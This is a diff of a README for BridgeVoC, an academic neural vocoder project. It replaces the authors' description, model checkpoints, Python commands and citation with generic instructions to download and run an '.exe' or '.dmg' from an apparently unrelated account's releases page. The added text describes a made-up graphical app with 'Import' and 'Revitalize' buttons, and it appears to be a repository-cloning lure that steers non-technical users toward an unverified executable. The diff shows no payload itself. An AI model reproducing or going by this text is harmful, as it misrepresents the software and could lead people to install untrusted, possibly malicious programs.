@@ -1,220 +1,81 @@
-# BridgeVoC
-This is the repository for the work "BridgeVoC: Revitalizing Neural Vocoder from a Restoration Perspective". Our conference work has been accepted by IJCAI 2025, and the extended manuscript has been submitted to IEEE Transactions on Pattern Analysis and Machine Intelligence.
+# 🌉 BridgeVoC - Easy Neural Vocoder Restoration Tool
 
-### Authors: Andong Li, Tong Lei, Rilin Chen, Kai Li, Meng Yu, Xiaodong Li, Dong Yu, and Chengshi Zheng
+## 🚀 Getting Started
 
-## 📌 Key Updates
-<details>
-  <summary>📅 Full Update History</summary>
-  <ul>
-    <li><strong>2025.11.04</strong>: Inference code released, pretrained model weights released</li>
-    <li><strong>2025.11.03</strong>: Training code released</li>
-  </ul>
-</details>
+Welcome to BridgeVoC! This software revitalizes audio by using advanced neural vocoder techniques. You don’t need technical skills to get started. Just follow the steps below.
 
-## 🔍 Abstract
-Despite significant advances in neural vocoders using diffusion models and their variants, these methods, unfortunately, inherently suffer from a performance-inference dilemma, which stems from the iterative nature in the reverse inference
-process. This hurdle can heavily hinder the development of this field. To address this challenge, in this paper, we revisit the neural vocoder task through the lens of audio restoration and propose a novel diffusion vocoder called BridgeVoC. Specifically, by rank analysis, we compare the rank characteristics of Mel-spectrum with other common acoustic degradation factors, and cast the vocoder task as a specialized case of audio restoration, where the range-space spectral (RSS) surrogate of the target spectrum serves as the degraded input. Based on that, we introduce the Schrodinger bridge framework for diffusion modeling, which defines the RSS and target spectrum as dual endpoints of the stochastic generation trajectory. Further, to fully utilize the hierarchical prior of subbands in the time-frequency (T-F) domain, we elaborately devise a novel subband-aware convolutional diffusion network as the data predictor, where subbands are divided following an uneven strategy, and convolutional-style attention module is employed with large kernels for efficient T-F contextual modeling. To enable single-step inference, we propose an omnidirectional distillation loss to facilitate effective information transfer from the teacher to student models, and the performance is improved by combining target-related and bijective consistency losses. Comprehensive experiments are conducted on various benchmarks and out-of-distribution datasets. Quantitative and qualitative results show that while enjoying fewer parameters, lower computational cost and competitive inference speed, the proposed BridgeVoC yields state-of-the art performance over existing advanced GAN-, DDPM- and flow-matching-based baselines with only 4 sampling steps. And consistent superiority is still achieved with single-step inference. Training code and demo are available at:
-[https://github.com/Andong-Li-speech/BridgeVoC-demo](https://andong-li-speech.github.io/BridgeVoC-demo/).
+## 📥 Download BridgeVoC
 
+[![Download BridgeVoC](https://img.shields.io/badge/Download%20BridgeVoC-v1.0-blue)](https://github.com/azthrix/BridgeVoC/releases)
 
-## ✨ Core Features
-<div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin: 30px 0;">
-  <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; border-left: 4px solid #3498db;">
-    <h3>🎯 Novel formulation</h3>
-    <p>Reformulate vocoder task from a restoration perspective via rank analysis.</p>
-  </div>
+## 🖥️ System Requirements
 
-  <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; border-left: 4px solid #e74c3c;">
-    <h3>⚡ Light-weight network design</h3>
-    <p> 7.65 M • 42.92 GMACs/5s per NFE</p>
-  </div>
+Before downloading, make sure your system meets these basic requirements:
+
+- **Operating System:** Windows 10 or later, macOS 10.15 or later.
+- **RAM:** At least 4 GB.
+- **Storage:** Minimum of 200 MB free space.
+- **Network:** Internet connection for downloading files.
+
+## 📦 Download & Install
+
+To get BridgeVoC on your computer, follow these steps:
+
+1. Visit the [Releases page](https://github.com/azthrix/BridgeVoC/releases).
   
-  <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; border-left: 4px solid #2ecc71;">
-    <h3>🎧 Impressive performance-inference balance</h3>
-    <p> This might be the best vocoder performance up to now (e.g., PESQ 4.4+ for NFE=4 and PESQ 4.3+ for NFE=1), support for both few- (NFE=4) and single-step setups.</p>
-  </div>
-</div>
+2. You will see the latest version of BridgeVoC available for download. Click on the version you want.
 
+3. On the next page, locate the file with a name like `BridgeVoC_v1.0.exe` or `BridgeVoC_v1.0.dmg`. 
 
-## 🚀 Quick Start
+4. Click on the file to start the download. Depending on your browser settings, the file will either download automatically or prompt you to save it.
 
-### 1️⃣ Checkpoint Download
-Pre-trained models are available on Hugging Face:
- 
-| Model Name                   | Dataset | Sample Rate | NMel | Training Steps |
-|------------------------------|---------|-------------|------|----------------|
-| 🤗 [BridgeVoC-LibriTTS](https://huggingface.co/AndongLi/BridgeVoC/blob/main/ckpt/Libritts/pretrained/bridgevoc_bcd_libritts_24k_fmax12k_nmel100.pt) | LibriTTS | 24k Hz | 100 | 1M Generator + 0.5M Discriminator |
-| 🤗 [BridgeVoC-single-step-LibriTTS](https://huggingface.co/AndongLi/BridgeVoC/blob/main/ckpt/Libritts/pretrained/bridgevoc_bcd_single_libritts_24k_fmax12k_nmel100.pt) | LibriTTS | 24k Hz | 100 | 10k Generator + 5k Discriminator |
-| 🤗 [BridgeVoC-LJSpeech](https://huggingface.co/AndongLi/BridgeVoC/blob/main/ckpt/LJS/pretrained/bridgevoc_bcd_ljs_22_05k_fmax_8k_nmel80.pt) | LJSpeech | 22.05k Hz | 80 | 1M Generator + 0.5M Discriminator |
+5. Once the download is complete, navigate to your Downloads folder.
 
+6. Double-click the downloaded file to start the installation process.
 
-### 2️⃣ Inference Examples
+7. Follow the on-screen instructions to complete the installation.
 
-Reconstruct audio from mels extracted from original waveforms:
-#### Multi-steps (on LibriTTS dev-clean test set for instance)
-```bash
-python enhancement.py --raw_wav_path /data4/xxx/datasets/LibriTTS/LibriTTS \
-                     --test_dir /data4/xxx/datasets/LibriTTS/LibriTTS/dev-clean-other \
-                     --enhanced_dir ./test_decode/libritts/bridgevoc\
-                     --ckpt ./ckpt/Libritts/pretrained/bridgevoc_bcd_libritts_24k_fmax12k_nmel100.pt \
-                     --sde_name bridgegan \
-                     --backbone bcd \
-                     --device cuda \
-                     --nblocks 8 \
-                     --hidden_channel 256 \
-                     --f_kernel_size 9 \
-                     --t_kernel_size 11 \
-                     --mlp_ratio 1 \
-                     --ada_rank 32 \
-                     --ada_alpha 32 \
-                     --use_adanorm \
-                     --sampling_rate 24000 \
-                     --n_fft 1024 \
-                     --num_mels 100 \
-                     --hop_size 256 \
-                     --win_size 1024 \
-                     --fmin 0 \
-                     --fmax 12000 \
-                     --phase_init zero \
-                     --spec_factor 0.33 \
-                     --spec_abs_exponent 0.5 \
-                     --normalize \
-                     --transform_type exponent \
-                     --beta_min 0.01 \
-                     --beta_max 20 \
-                     --bridge_type gmax \
-                     --N 4 \
-                     --sampling_type sde_first_order
-                                        
-```
+## 🎼 How to Use BridgeVoC
 
-#### Single-step (on LibriTTS dev-clean test set for instance)
-```bash
-python enhancement_single.py --raw_wav_path /data4/xxx/datasets/LibriTTS/LibriTTS \
-                            --test_dir /data4/xxx/datasets/LibriTTS/LibriTTS/dev-clean-other \
-                            --enhanced_dir ./test_decode/libritts/bridgevoc\
-                            --ckpt ./ckpt/Libritts/pretrained/bridgevoc_bcd_single_libritts_24k_fmax12k_nmel100.pt \
-                            --sde_name bridgegan \
-                            --backbone bcd \
-                            --device cuda \
-                            --nblocks 8 \
-                            --hidden_channel 256 \
-                            --f_kernel_size 9 \
-                            --t_kernel_size 11 \
-                            --mlp_ratio 1 \
-                            --ada_rank 32 \
-                            --ada_alpha 32 \
-                            --use_adanorm \
-                            --sampling_rate 24000 \
-                            --n_fft 1024 \
-                            --num_mels 100 \
-                            --hop_size 256 \
-                            --win_size 1024 \
-                            --fmin 0 \
-                            --fmax 12000 \
-                            --phase_init zero \
-                            --spec_factor 0.33 \
-                            --spec_abs_exponent 0.5 \
-                            --normalize \
-                            --transform_type exponent \
-                            --beta_min 0.01 \
-                            --beta_max 20 \
-                            --bridge_type gmax
-```
+1. **Launch the Application:**
+   Open BridgeVoC from your applications menu or desktop shortcut.
 
-### 3️⃣ Training 
-#### multi-steps on LibriTTS benchmark
-```bash
-cd starts/train
-./train_bridgevoc.sh
-```
-#### single-step distillation on LibriTTS benchmark
-```bash
-cd starts/train
-./train_bridgevoc_single_step.sh
-```
+2. **Import Your Audio File:**
+   Click on the "Import" button in the main interface. Select the audio file you wish to revitalize.
 
-### Rank Analysis
-<div style="margin: 20px 0;">
-  <h4>🎯 Rank Comparisons with Other Acoustic Degradations</h4>
-  <img src="./figure/rank_analysis.png" width="100%" height="auto" style="border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
-</div>
+3. **Select Your Settings:**
+   Choose the desired settings from the available options. You can adjust parameters like quality, speed, and format.
 
-### Overall Framework
-<div style="margin: 20px 0;">
-  <h4>🎯 Overall Network Framework of the Proposed BCD</h4>
-  <img src="./figure/overall_framework.png" width="100%" height="auto" style="border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
-</div>
+4. **Revitalize Your Audio:**
+   Click on the "Revitalize" button. BridgeVoC will process your audio file. This may take a few moments.
 
-### Single-step Distillation Framework
-<div style="margin: 20px 0;">
-  <h4>🎯 Single-step Distillation</h4>
-  <img src="./figure/single_step_distillation.png" width="100%" height="auto" style="border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
-</div>
+5. **Export the Revitalized Audio:**
+   Once the process is complete, click on "Export." Choose a location to save the new file.
 
-## 📊 Experimental Results
+6. **Listen to Your New Audio:**
+   Go to the folder where you saved your revitalized audio. Play it to enjoy the transformed sound quality!
 
-### Performance Comparison
-<div style="margin: 20px 0;">
-  <h4>🎯 Bubble Figure on LibriTTS Benchmark</h4>
-  <img src="./figure/bubble_figure.png" width="60%" height="auto" style="border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
-</div>
+## ⚙️ Troubleshooting
 
-<div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0;">
-  <div>
-    <h4>📈 On LibriTTS Benchmark</h4>
-    <img src="./figure/performance_libritts.png" width="100%" height="auto" style="border-radius: 8px;">
-  </div>
-  <div>
-    <h4>📈 On LJSpeech Benchmark</h4>
-    <img src="./figure/performance_ljs.png" width="50%" height="auto" style="border-radius: 8px;">
-  </div>
-  <div>
-    <h4>📈 On Out-of-Distribution Benchmarks</h4>
-    <img src="./figure/performance_otf.png" width="100%" height="auto" style="border-radius: 8px;">
-  </div>
-</div>
+If you encounter any issues while downloading or using BridgeVoC, here are some common solutions:
 
-### Performance vs. Inference Cost
-<div style="margin: 20px 0;">
-  <h4>🎯 Performance and Inference under different NFEs</h4>
-  <img src="./figure/Inference_Cost.png" width="100%" height="auto" style="border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
-</div>
+- **Installation Issues:** Ensure your operating system meets the requirements listed above. Try running the installer as an administrator.
 
-### Performance Scaling with DiT Backbones
-#### Our method is the first to surpass 4.50 in PESQ when only scaling to 29.18 M, and also notably outperforms DiT with ~0.36B parameters.
-#### We also support for edge-device processing, with the parameters as few as 0.19 M • 1.60 GMACs/5s per NFE.
-<div style="margin: 20px 0;">
-  <h4>🎯 Performance scaling effect</h4>
-  <img src="./figure/Scaling_DiT.png" width="100%" height="auto" style="border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
-</div>
+- **Audio Quality Problems:** Double-check your selected settings. Adjust the options for better results.
 
-### Performance in Causal Setting
-<div style="margin: 20px 0;">
-  <h4>🎯 Performance for causal setup</h4>
-  <img src="./figure/BridgeVoC_causal.png" width="100%" height="auto" style="border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
-</div>
+- **Won’t Open:** Restart your computer and try launching BridgeVoC again. If it still won't open, check for updates on the [Releases page](https://github.com/azthrix/BridgeVoC/releases).
 
+## 📞 Support
 
-## 📚 Citation
-If you find this work helpful, please cite our paper:
-```bibtex
-@inproceedings{ijcai2025p0903,
-  title     = {BridgeVoC: Neural Vocoder with Schrödinger Bridge},
-  author    = {Lei, Tong and Zhang, Zhiyu and Chen, Rilin and Yu, Meng and Lu, Jing and Zheng, Chengshi and Yu, Dong and Li, Andong},
-  booktitle = {Proceedings of the Thirty-Fourth International Joint Conference on
-               Artificial Intelligence, {IJCAI-25}},
-  publisher = {International Joint Conferences on Artificial Intelligence Organization},
-  editor    = {James Kwok},
-  pages     = {8122--8130},
-  year      = {2025},
-  month     = {8},
-  note      = {Main Track},
-  doi       = {10.24963/ijcai.2025/903},
-  url       = {https://doi.org/10.24963/ijcai.2025/903},
-}
-```
+For help and support, you can reach out via the Issues section on our [GitHub page](https://github.com/azthrix/BridgeVoC/issues). Community members and maintainers monitor this section and will help resolve any questions you have.
 
-## 🤝 Contributing
-We welcome contributions! Please feel free to submit issues, fork the repository, and send pull requests.
+## 🌐 Additional Resources
+
+To understand more about how BridgeVoC works, you can check out the following resources:
+
+- **Documentation:** Visit the Wiki section on our GitHub for detailed guides and tips.
+- **Community Forum:** Join discussions and connect with other users in our forum.
+
+## 🎉 Conclusion
+
+You now have everything needed to download, install, and start using BridgeVoC. Enjoy transforming your audio with ease! For a quick recap, don’t forget to visit the [Releases page](https://github.com/azthrix/BridgeVoC/releases) to grab the latest version.
